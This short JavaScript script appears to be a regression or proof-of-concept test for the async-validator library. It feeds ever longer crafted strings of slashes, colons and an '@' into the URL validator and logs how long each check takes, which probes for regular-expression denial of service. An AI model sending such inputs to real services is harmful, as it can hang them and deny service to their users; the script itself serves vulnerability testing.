import AsyncValidator from '../src/';

const validator = new AsyncValidator({
  v: {
    type: 'url',
  },
});

for (var i = 1; i <= 50000; i++) {
  var time = Date.now();
  var attack_str = '//' + ':'.repeat(i * 10000) + '@';
  validator.validate({
    v: attack_str,
  });
  var time_cost = Date.now() - time;
  console.log(
    'attack_str.length: ' + attack_str.length + ': ' + time_cost + ' ms',
  );
}
